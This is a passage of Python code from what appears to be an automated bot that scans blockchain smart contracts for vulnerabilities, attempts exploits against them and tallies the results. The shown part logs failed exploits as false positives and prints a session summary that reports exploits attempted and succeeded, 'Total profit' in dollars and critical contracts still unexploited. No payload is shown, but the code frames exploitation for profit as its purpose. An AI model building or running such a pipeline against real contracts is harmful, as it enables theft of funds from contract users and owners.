            else:
                # Calibrate: this was a false positive (exploit failed)
                self.calibrator.record_outcome(
                    finding.get('vuln_id', ''),
                    finding.get('source', ''),
                    was_exploitable=False,
                )
                self.alerts.send_exploit_result(
                    success=False, tx_hash='',
                    target=target_addr,
                    chain=chain_name,
                )
        except Exception as e:
            print(f'  EXPLOIT PIPELINE ERROR: {e}')
            import traceback
            traceback.print_exc()
            self.db.log_execution(
                contract_address=target_addr, chain_id=chain_id,
                action='pipeline_error', success=False, error=str(e),
            )

    def _print_session_summary(self):
        stats = self.db.get_stats()
        cal_stats = self.calibrator.get_stats()

        print(f'\n{"="*60}')
        print(f'  SESSION SUMMARY v3.0')
        print(f'  {"="*60}')
        print(f'  Cycles: {self.cycle_count}')
        print(f'  Targets scanned: {self.total_targets_scanned}')
        print(f'  Findings: {self.total_findings} (C:{self.total_critical} H:{self.total_high})')
        print(f'  FP eliminated: {self.false_positives_eliminated}')
        print(f'  Exploits attempted: {self.total_exploits_attempted}')
        print(f'  Exploits succeeded: {self.total_exploits_succeeded}')
        print(f'  Total profit: ${self.total_profit_usd:,.2f}')
        print(f'  --- Calibration ---')
        for key, s in cal_stats.items():
            print(f'    {key}: {s["true_positive_rate"]:.0%} TP ({s["total_samples"]} samples)')
        print(f'  --- DB Totals ---')
        print(f'  Protocols: {stats["protocols"]}')
        print(f'  Findings: {stats["findings"]}')
        print(f'  Executions: {stats["executions"]}')
        print(f'  Unexploited critical: {stats["unexploited_critical"]}')
        print(f'  Zero-cap unexploited: {stats["zero_cap_unexploited"]}')
        print(f'  DB total profit: ${stats["total_profit_usd"]:,.2f}')
        print(f'  {"="*60}')
